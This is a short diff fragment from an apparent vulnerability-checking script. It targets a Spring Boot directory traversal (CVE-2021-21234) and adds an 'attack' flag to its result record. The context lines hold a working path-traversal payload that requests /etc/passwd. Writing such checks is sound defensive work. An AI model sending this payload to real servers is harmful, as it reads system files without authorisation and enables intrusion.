@@ -5,7 +5,8 @@ import urllib
 def verify(url):
     relsult = {
         'name': 'Spring Boot 目录遍历 （CVE-2021-21234）',
-        'vulnerable': False
+        'vulnerable': False,
+        'attack': True,
     }
     try:
         payload1 = '/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../../../'
